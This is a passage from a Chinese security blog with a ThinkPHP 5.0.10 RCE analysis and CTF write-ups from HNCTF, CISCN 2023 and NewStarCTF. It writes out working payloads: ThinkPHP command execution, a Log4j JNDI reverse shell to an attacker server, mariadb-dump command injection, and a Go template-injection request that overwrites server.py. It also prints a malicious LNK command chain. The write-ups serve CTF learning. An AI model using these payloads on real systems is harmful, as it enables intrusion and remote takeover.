class="comment">//127.0.0.1/tp5.0.10/public/index.php?s=/index/Index/hello/name/world</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php?s=/index/Index/hello&amp;name=world</span></span><br></pre></td></tr></table></figure><h2 id="Request类任意调用-construct方法导致的rce"><a href="#Request类任意调用-construct方法导致的rce" class="headerlink" title="Request类任意调用__construct方法导致的rce"></a>Request类任意调用__construct方法导致的rce</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Request核心类**$method** 来自可控的 <strong>$_POST</strong> 数组，而且在获取之后没有进行任何检查，直接把它作为 <strong>Request</strong> 类的方法进行调用，同时，该方法传入的参数是可控数据 <strong>$_POST</strong> 。导致可以随意调用 <strong>Request</strong> 类的部分方法</p><blockquote><p><strong>过程：</strong></p><p>让method等于 <code>__construct</code>魔术方法，然后里面的 <code>foreach</code>函数造成变量覆盖。然后通过<strong>Request</strong> 类中的 <code>param</code>方法最终又调用了<code>filterValue</code>方法，而该方法中就存在可利用的 <strong>call_user_func</strong> 函数，从而执行任意命令</p></blockquote><blockquote><p><strong>Request</strong> 类中的 <code>param、route、get、post、put、delete、patch、request、session、server、env、cookie、input</code> 方法均调用了 <strong>filterValue</strong> 方法，而该方法中就存在可利用的 <strong>call_user_func</strong> 函数</p></blockquote><p>以5.0.10版本为例</p><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/tp5.0.10/public/index.php</span><br><span class="line"></span><br><span class="line"># post</span><br><span class="line">_method=__construct&amp;filter=system&amp;cmd=whoami</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230531225820851.png" alt="image-20230531225820851"></p><h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><p>第一个断点下在<code>thinkphp/libary/think/App.php</code>文件，调用<code>routeCheck</code>进行调度解析这里</p><p><img src="/../images/image-20230531221156861.png" alt="image-20230531221156861"></p><p>跟进<code>routeCheck</code></p><p><img src="/../images/image-20230531221218359.png" alt="image-20230531221218359"></p><p>跟进<code>check</code></p><p><img src="/../images/image-20230531221233596.png" alt="image-20230531221233596"></p><p>跟进<code>method</code></p><p><img src="/../images/image-20230531221259178.png" alt="image-20230531221259178"></p><p><code>var_method</code>在<code>application/config.php</code>中</p><p><img src="/../images/image-20230531222320838.png" alt="image-20230531222320838"></p><p>所以这里可以控制<code>method</code>变量，从而任意调用Request类的方法。</p><p>如果调用<code>__construct</code>方法</p><p><img src="/../images/image-20230531221707200.png" alt="image-20230531221707200"></p><p>存在一个<code>foreach</code>循环，如果传入的<code>options</code>数组的键名为该类的属性，就用键值覆盖该属性的值。</p><p><img src="/../images/image-20230531222852250.png" alt="image-20230531222852250"></p><p>继续往下</p><p>在<code>App::run()</code>方法里面，如果我们开启了debug模式，则会调用<code>Request::param()</code>方法：</p><p><img src="/../images/image-20230531223011915.png" alt="image-20230531223011915"></p><p>就算没有开启debug模式，下面的exec方法也会调用</p><p><img src="/../images/image-20230531230604547.png" alt="image-20230531230604547"></p><p><img src="/../images/image-20230531220640414.png" alt="image-20230531220640414"></p><p>跟进<code>Request::param()</code>方法</p><p>将获取到的post参数用<code>array_merge</code>与get方式的参数进行合并</p><p><img src="/../images/image-20230531225110758.png" alt="image-20230531225110758"></p><p>最后将其传入<code>input</code>中</p><p><img src="/../images/image-20230531224212939.png" alt="image-20230531224212939"></p><p>跟进<code>Request::input()</code>,<code>array_walk_recursive</code>  对数组中的每个成员递归地应用用户函数</p><p><img src="/../images/image-20230531224435122.png" alt="image-20230531224435122"></p><p>然后<code>filterValue</code>方法中，调用了<code>call_user_func</code>造成任意命令执行</p><p><img src="/../images/image-20230531223158698.png" alt="image-20230531223158698"></p><h3 id="关键点总结"><a href="#关键点总结" class="headerlink" title="关键点总结"></a>关键点总结</h3><p>From：七月火师傅的一张流程图</p><p><img src="/../images/1964477-20220405155310200-1040131440.png" alt="img"></p><h3 id="其他版本"><a href="#其他版本" class="headerlink" title="其他版本"></a>其他版本</h3><p>流程大同小异</p><p>payload总结：<a href="https://y4er.com/posts/thinkphp5-rce/#thinkphp5-method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce">https://y4er.com/posts/thinkphp5-rce/#thinkphp5-method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HNCTF 2022</title>
      <link href="/2023/05/31/HNCTF/"/>
      <url>/2023/05/31/HNCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="HNCTF-2022-WEEK3-Fun-php"><a href="#HNCTF-2022-WEEK3-Fun-php" class="headerlink" title="[HNCTF 2022 WEEK3]Fun_php"></a>[HNCTF 2022 WEEK3]Fun_php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$getUserID</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]; </span><br><span class="line"><span class="variable">$getpass</span> = (<span class="keyword">int</span>)@<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]; </span><br><span class="line"><span class="variable">$getmySaid</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;mySaid&#x27;</span>]; </span><br><span class="line"><span class="variable">$getmyHeart</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;myHeart&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$verify</span> =@<span class="variable">$_POST</span>[<span class="string">&#x27;verify&#x27;</span>];</span><br><span class="line"><span class="variable">$want</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;want&#x27;</span>];</span><br><span class="line"><span class="variable">$final</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;final&#x27;</span>];</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$getUserID</span>))</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$user</span> + <span class="variable">$getUserID</span>; <span class="comment">//u5er_D0_n0t_b3g1n_with_4_numb3r</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span> == <span class="number">114514</span> &amp;&amp; <span class="variable">$getpass</span> == <span class="variable">$pass</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$getmySaid</span>)) </span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$getmyHeart</span>)) </span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$getmySaid</span>) != <span class="title function_ invoke__">md5</span>(<span class="variable">$getmyHeart</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Cheater!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="variable">$week_1</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>字符串与数字弱比较</p><blockquote><p>u5er_D0_n0t_b3g1n_with_4_numb3r</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;sdasd114514&#x27;</span> ==  <span class="number">114514</span></span><br><span class="line">    </span><br><span class="line">get --&gt; user=<span class="number">114514</span></span><br></pre></td></tr></table></figure></li><li><p>猜测$pass为字符串</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;dbasdha&#x27;</span> == <span class="number">0</span> <span class="comment">//True</span></span><br><span class="line"></span><br><span class="line">get --&gt; pass=<span class="number">0</span></span><br></pre></td></tr></table></figure></li><li><p>字符串与数字MD5相等</p><p>科学计数法绕过  <strong>0e开头的数字字符串</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s214587387a</span><br><span class="line">   </span><br><span class="line"><span class="number">1586264293</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]===<span class="string">&quot;Probius&quot;</span>) <span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span>[<span class="variable">$i</span>]=<span class="title function_ invoke__">intval</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;Probius&quot;</span>,<span class="variable">$data</span>)===<span class="number">0</span>)</span><br><span class="line">        <span class="variable">$week_2</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;HACK!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>array_search默认弱比较查找,返回查找成功元素的下标</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post --&gt; data[]=<span class="number">0</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$week_1</span> &amp;&amp; <span class="variable">$week_2</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$data</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$verify</span>))</span><br><span class="line">        <span class="comment">// ‮⁦HNCTF⁩⁦Welcome to</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;hn&quot;</span> == <span class="variable">$_GET</span>[<span class="string">&#x27;hn&#x27;</span>] &amp;‮⁦+!!⁩⁦&amp; <span class="string">&quot;‮⁦ Flag!⁩⁦ctf&quot;</span> == <span class="variable">$_GET</span>[‮⁦LAG⁩⁦ctf]) &#123; <span class="comment">//HN! flag!! F</span></span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\fl4g|\\$|&#x27;|\&quot;/i&quot;</span>,<span class="variable">$want</span>)Or <span class="title function_ invoke__">is_file</span>(<span class="variable">$want</span>))</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;HACK!&quot;</span>);</span><br><span class="line">       </span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;Fine!you win&quot;</span>;</span><br><span class="line">                    <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ./<span class="subst">$want</span>&quot;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;HACK!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>md5弱比较，数组绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post --&gt; data[]=<span class="number">0</span>&amp;verify[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221101183032110-1686150252660.png" alt="image-20221101183032110"></p><p>零宽度隐写，？？？？</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get --&gt; </span><br><span class="line">    </span><br><span class="line">hn=hn&amp;%E2%<span class="number">80</span>%AE%E2%<span class="number">81</span>%A6LAG%E2%<span class="number">81</span>%A9%E2%<span class="number">81</span>%A6ctf=%E2%<span class="number">80</span>%AE%E2%<span class="number">81</span>%A6%<span class="number">20</span>Flag!%E2%<span class="number">81</span>%A9%E2%<span class="number">81</span>%A6ctf</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\fl4g|\\$|&#x27;|\&quot;/i&quot;</span>,<span class="variable">$want</span>)Or <span class="title function_ invoke__">is_file</span>(<span class="variable">$want</span>))</span><br></pre></td></tr></table></figure><p>通配符绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post --&gt; want=f*</span><br></pre></td></tr></table></figure><h3 id="HNCTF-2022-WEEK3-logjjjjlogjjjj"><a href="#HNCTF-2022-WEEK3-logjjjjlogjjjj" class="headerlink" title="[HNCTF 2022 WEEK3]logjjjjlogjjjj"></a>[HNCTF 2022 WEEK3]logjjjjlogjjjj</h3><p>复现：<a href="https://blog.csdn.net/weixin_47179815/article/details/125654828">https://blog.csdn.net/weixin_47179815/article/details/125654828</a></p><p>本地环境：JDK版本1.8</p><p>攻击流程</p><ul><li><p>服务器运行攻击脚本生成payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,base64(反弹shell)&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 服务器ip</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20221101211620970-1686150252661.png" alt="image-20221101211620970"></p><ul><li><p>服务器监听端口</p></li><li><p>发送payload</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:xxx:<span class="comment">//xxxx/xxx&#125;</span></span><br><span class="line">将上面生成的payload放入（优先JDK）</span><br></pre></td></tr></table></figure><p>URL编码后发送请求</p><p><img src="/../images/image-20221101211959222-1686150252662.png" alt="image-20221101211959222"></p></li></ul><p>成功连接</p><img src="E:\typora img\image-20221101211512855.png" alt="image-20221101211512855" style="zoom:50%;" /><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="简单编码"><a href="#简单编码" class="headerlink" title="简单编码"></a>简单编码</h3><p>图片尾部有一串url编码后的字符</p><p><img src="/../images/image-20221102000004428-1686150252663.png" alt="image-20221102000004428"></p><h3 id="HNCTF-2022-Week1-线下单杀出题人（OSINT"><a href="#HNCTF-2022-Week1-线下单杀出题人（OSINT" class="headerlink" title="[HNCTF 2022 Week1]线下单杀出题人（OSINT)"></a>[HNCTF 2022 Week1]线下单杀出题人（OSINT)</h3><p><img src="/../images/image-20221101232202282-1686150252663.png" alt="image-20221101232202282"></p><p>首先从A图片中提取出经纬度</p><p><img src="/../images/image-20221101232242899-1686150252663.png" alt="image-20221101232242899"></p><p>因为这个经纬度是度分秒的形式，需要先转换为度数形式</p><p>格式转换：<a href="http://www.gzhatu.com/du2dfm.html">http://www.gzhatu.com/du2dfm.html</a></p><p>定位：<a href="http://www.gzhatu.com/dingwei.html">http://www.gzhatu.com/dingwei.html</a></p><p><img src="/../images/image-20221101232434815-1686150252663.png" alt="image-20221101232434815"></p><p>A图片中还有一个提示</p><p><img src="/../images/image-20221101232718045-1686150252663.png" alt="image-20221101232718045"></p><p>所以可以确定定位是正确的。</p><p>然后根据第二张图中的河流可以知道是往哪条路走的。</p><img src="E:\typora img\image-20221101232747393.png" alt="image-20221101232747393" style="zoom:67%;" /><p>用高德地图定位嘉兴电信大厦，往那条路找，找到</p><img src="E:\typora img\image-20221101232627057.png" alt="image-20221101232627057" style="zoom:67%;" /><p>flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(md5(<span class="string">&#x27;嘉兴市南湖区禾兴北路506号亚芬汀精品酒店&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest())<span class="comment">#utf-8编码</span></span><br></pre></td></tr></table></figure><p>SSCTF{f833a4d17d35ca5da40f087950293d04}</p><p>也可以用exif工具查看</p><img src="E:\typora img\image-20221101234725942.png" alt="image-20221101234725942" style="zoom: 50%;" /><h3 id="HNCTF-2022-Week1-三生三世"><a href="#HNCTF-2022-Week1-三生三世" class="headerlink" title="[HNCTF 2022 Week1]三生三世"></a>[HNCTF 2022 Week1]三生三世</h3><p>弱密码爆破，图片base64隐写得到二维码，扫描后用栅栏密码解密，每组字数为3.</p><h3 id="HNCTF-2022-Week1-silly-zip"><a href="#HNCTF-2022-Week1-silly-zip" class="headerlink" title="[HNCTF 2022 Week1]silly_zip"></a>[HNCTF 2022 Week1]silly_zip</h3><p>伪加密+IHDR修改</p><h3 id="HNCTF-2022-Week1-piz-galf"><a href="#HNCTF-2022-Week1-piz-galf" class="headerlink" title="[HNCTF 2022 Week1]piz.galf"></a>[HNCTF 2022 Week1]piz.galf</h3><p>两次逆序</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\khaz\Downloads\pmb.galf&quot;</span> , <span class="string">&#x27;rb&#x27;</span> ).read()</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\khaz\Downloads\flag.bmp&quot;</span> , <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f2.write(f[ ::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2023 初赛</title>
      <link href="/2023/05/31/CISCN2023%E5%88%9D%E8%B5%9B/"/>
      <url>/2023/05/31/CISCN2023%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="27日-unzip"><a href="#27日-unzip" class="headerlink" title="27日_unzip"></a><strong>27日_unzip</strong></h2><p>打开网站，是一个文件上传的功能点，配合题目的名字，直接上传一个软链接文件，然后回显</p><p><img src="/../images/image-20230528170519886-1686150302067.png" alt="image-20230528170519886"></p><p>发现只能上传zip文件，并且使用了<code>unzip</code>命令来解压缩上传的压缩包，所以不能使用路径穿越</p><blockquote><p>因为<code>unzip</code>默认会忽视文件名中<code>../</code></p></blockquote><p><img src="/../images/image-20230528171026375-1686150302067.png" alt="image-20230528171026375"></p><p>但是可以通过软链接达到路径穿越的功能。</p><p>先创建一个软链接指向网站目录，压缩为1.zip</p><blockquote><p>zip要加上-y参数，才能保存软链接</p></blockquote><p><img src="/../images/Snipaste_2023-05-28_15-44-03-1686150302068.png" alt="Snipaste_2023-05-28_15-44-03"></p><p>然后再创建一个与软链接同名的目录，并在该目录下创建木马文件，将该目录压缩为2.zip</p><p><img src="/../images/Snipaste_2023-05-28_15-43-44-1686150302068.png" alt="Snipaste_2023-05-28_15-43-44"></p><p>然后先上传1.zip，解压得到软链接<code>test</code>，再上传2.zip，解压得到test目录和shell.php，因为test指向&#x2F;var&#x2F;www&#x2F;html,所以shell.php实际上是被解压到网站目录下</p><p><img src="/../images/Snipaste_2023-05-28_15-45-01-1686150302068.png" alt="Snipaste_2023-05-28_15-45-01"></p><p><img src="/../images/Snipaste_2023-05-28_15-45-12-1686150302068.png" alt="Snipaste_2023-05-28_15-45-12"></p><p>最后访问，执行<code>cat /flag</code>即可</p><p><img src="/../images/Snipaste_2023-05-28_15-45-38-1686150302068.png" alt="Snipaste_2023-05-28_15-45-38"></p><h2 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a><strong>dumpit</strong></h2><p>访问网站看到</p><p><img src="/../images/image-20230528171725614-1686150302068.png" alt="image-20230528171725614"></p><p>可以dump和query</p><p>一开始是对着query怼的，因为对dump不熟</p><p><img src="/../images/image-20230528171909470-1686150302069.png" alt="image-20230528171909470"></p><p>把语句打印出来了，所以很明显可以控制table_2_query进行注入，然后题目提示了flag在&#x2F;flag，所以先尝试可不可以写文件getshell，发现不行，查了一下secure_file_priv为NULL确实是不行的</p><p><img src="/../images/image-20230528172420662-1686150302069.png" alt="image-20230528172420662"></p><p>尝试堆叠注入，看一下能不能日志getshell，发现；反引号都被过滤了</p><p><img src="/../images/image-20230528172554485-1686150302069.png" alt="image-20230528172554485"></p><p>所以query这条路就走不通了。</p><p>然后是dump，在网上查到</p><p><img src="/../images/image-20230528172802761-1686150302069.png" alt="image-20230528172802761"></p><p><img src="/../images/image-20230528172816727-1686150302069.png" alt="image-20230528172816727"></p><p>知道了是使用系统命令来dump，这里就存在命令执行漏洞</p><p><img src="/../images/image-20230528173216386-1686150302069.png" alt="image-20230528173216386"></p><p>参照笔记，这里只用0d%0a可以。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?db=ctf&amp;table_2_dump=%0d%0a cat index.php </span><br></pre></td></tr></table></figure><p>在here中可以看到源码</p><p><img src="/../images/image-20230528173600848-1686150302069.png" alt="image-20230528173600848"></p><p>关键点</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$black</span> = <span class="string">&#x27;;`*#^$&amp;|&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dump</span>=<span class="string">&#x27;mariadb-dump &#x27;</span>.<span class="variable">$db</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$t2d</span>.<span class="string">&#x27; &gt;./log/&#x27;</span>.<span class="variable">$randstr</span>.<span class="string">&#x27;.log&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$dump</span>);</span><br></pre></td></tr></table></figure><p>然后题目不是说了flag在&#x2F;flag，读了一下发现没用，看了一下权限</p><p><img src="/../images/image-20230528173721850-1686150302069.png" alt="image-20230528173721850"></p><p>开始想着写个🐎，上去提权试试，看了下目录权限，反弹shell也失败了（麻了😅）</p><p><img src="/../images/image-20230528173754533-1686150302069.png" alt="image-20230528173754533"></p><p>后面想到可能被骗了，在环境变量中找到了flag</p><p><img src="/../images/Snipaste_2023-05-28_15-35-41-1686150302069.png" alt="Snipaste_2023-05-28_15-35-41"></p><h2 id="go-session–复现"><a href="#go-session–复现" class="headerlink" title="go_session–复现"></a>go_session–复现</h2><p>本地伪造session</p><p><img src="/../images/image-20230608095627395.png" alt="image-20230608095627395"></p><p><img src="/../images/image-20230608095722517.png" alt="image-20230608095722517"></p><p>测试一下，发现伪造成功了</p><p><img src="/../images/image-20230608095852646.png" alt="image-20230608095852646"></p><p><img src="/../images/image-20230608095436931.png" alt="image-20230608095436931"></p><p>django</p><p><img src="/../images/image-20230608104903856.png" alt="image-20230608104903856"></p><p>go</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func (c *Context) SaveUploadedFile(file *multipart.FileHeader, dst string) error</span><br></pre></td></tr></table></figure><p>SaveUploadedFile上传表单文件到指定的dst</p><p>第一个参数为表单name，第二个参数为要保存的位置</p><p>读取源码</p><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/admin?name=&#123;%25include+c.Request.Referer()%25&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>E:/test.txt</span><br><span class="line"></span><br><span class="line">/app/server.py</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230608100900686.png" alt="image-20230608100900686"></p><p>发现它是debug模式的，<strong>热部署（就是每次修改之后会重新编译运行一次）</strong></p><p>所以我们可以进行覆盖</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GET /admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.ClientIP()),c.Query(c.ClientIP()))&#125;&#125;&amp;<span class="number">118.117</span><span class="number">.49</span><span class="number">.52</span>=/app/server.py HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">124.220</span><span class="number">.192</span><span class="number">.120</span>:<span class="number">8888</span></span><br><span class="line">Content-<span class="type">Type</span>: multipart/form-data; boundary=----WebKitFormBoundary7IWRoUoGnVmsx4c3</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh,zh-CN;q=<span class="number">0.9</span></span><br><span class="line">Cookie: session-name=MTY4NTE3NzM2NnxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXxY2f3GZVJmQsLELqlORmAjQMLNbC9ZF0rs_HfZqjIRlw==</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: <span class="number">488</span></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7IWRoUoGnVmsx4c3</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;118.117.49.52&quot;</span>; filename=<span class="string">&quot;server.py&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: text/x-python</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    result = subprocess.run([<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;/flag&#x27;</span>], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> result.stdout.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br><span class="line">------WebKitFormBoundary7IWRoUoGnVmsx4c3--</span><br></pre></td></tr></table></figure><p>覆盖完后，访问<code>/flask?name=</code>，成功读取到了&#x2F;flag</p><p><img src="/../images/image-20230608102742110.png" alt="image-20230608102742110"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a><strong>pyshell</strong></h2><p>一眼python沙盒逃逸</p><p>简单测试一下</p><p><img src="/../images/image-20230528175915350-1686150302070.png" alt="image-20230528175915350"></p><p><img src="/../images/image-20230528180007692-1686150302070.png" alt="image-20230528180007692"></p><p>绕一下<code>__import__</code>和<code>system</code></p><p><img src="/../images/image-20230528175941443-1686150302070.png" alt="image-20230528175941443"></p><p>可以用+拼接绕过，最后用_特性和eval函数执行字符串即可</p><p><img src="/../images/image-20230528180159183-1686150302070.png" alt="image-20230528180159183"></p><p>最后的payload</p><p><img src="/../images/image-20230528165834909-1686150302070.png" alt="image-20230528165834909"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF</title>
      <link href="/2023/05/31/NewstarCTF/"/>
      <url>/2023/05/31/NewstarCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="week5"><a href="#week5" class="headerlink" title="week5"></a>week5</h2><h3 id="最后的流量分析"><a href="#最后的流量分析" class="headerlink" title="最后的流量分析"></a>最后的流量分析</h3><p>先按照数据包大小排列，看了几个包发现是sql布尔盲注（上周的sql我用的就是布尔盲注）。</p><p><img src="/../images/image-20221020130300434-1686150281425.png" alt="image-20221020130300434"></p><p>上图为正确回显</p><p>进行过滤</p><p><img src="/../images/image-20221020130340038-1686150281425.png" alt="image-20221020130340038"></p><p>一个一个找就行了</p><h3 id="奇怪的PDF-2"><a href="#奇怪的PDF-2" class="headerlink" title="奇怪的PDF 2"></a>奇怪的PDF 2</h3><p>下载下来是一个快捷方式，打开是《欺骗的艺术》这本书。😱</p><p>它是快捷方式，很自然就去看它指向了哪个文件</p><p><img src="/../images/image-20221020130709420-1686150281425.png" alt="image-20221020130709420"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash">SystemRoot%\system32\cmd.exe /c copy <span class="string">&quot;strange2.pdf.lnk&quot;</span> %tmp%\\g5ZokyumBB2gDn.tmp /y</span></span><br><span class="line"></span><br><span class="line">for /r C:\\Windows\\System32\\ %i in (*ertu*.exe) do copy %i %tmp%\\msoia.exe /y</span><br><span class="line"></span><br><span class="line">findstr.exe&quot;TVNDRgAAAA&quot;%tmp%\\g5ZokyumBB2gDn.tmp&gt;%tmp%\\cSi1r0uywDNvDu.tmp&amp;%tmp%\\msoia.ex</span><br></pre></td></tr></table></figure><p>然后搜索msoia.exe就得到了类似的题</p><p><a href="https://www.anquanke.com/post/id/267031">https://www.anquanke.com/post/id/267031</a></p><p><a 